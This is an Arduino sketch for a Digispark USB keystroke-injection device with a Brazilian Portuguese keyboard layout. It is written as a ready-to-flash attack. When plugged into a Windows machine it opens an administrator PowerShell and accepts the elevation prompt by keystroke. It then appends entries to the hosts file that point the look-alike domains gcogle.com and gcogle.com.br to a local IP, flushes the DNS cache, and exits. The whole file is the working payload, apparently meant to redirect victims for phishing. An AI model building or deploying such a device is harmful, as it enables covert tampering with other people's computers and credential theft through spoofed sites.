
#define LAYOUT_PORTUGUESE_BRAZILIAN
#include "DigiKeyboard.h"

#define LED_PIN 1
#define LED_DELAY 250

#define KEYBOARD_DELAY 500

void setup() {
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);
}

void loop() {

    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(KEYBOARD_DELAY);

    // This opens an administrator command prompt
    DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
    DigiKeyboard.delay(KEYBOARD_DELAY);
    DigiKeyboard.sendKeyStroke(KEY_A);
    DigiKeyboard.delay(KEYBOARD_DELAY * 2);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(KEYBOARD_DELAY * 2);

    // Adds the set [ip <-> domain] to the hosts file
    DigiKeyboard.println("Add-Content -Path C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS -Value \"\
\n192.168.1.189 gcogle.com\
\n192.168.1.189 gcogle.com.br\
\"");

    // Clears dns cache
    DigiKeyboard.println("ipconfig /flushdns");

    // Exits the terminal
    DigiKeyboard.println("exit");

    // Blink LED after run
    for (;;) {
        digitalWrite(LED_PIN, HIGH);
        delay(LED_DELAY);
        digitalWrite(LED_PIN, LOW);
        delay(LED_DELAY);
    }
}
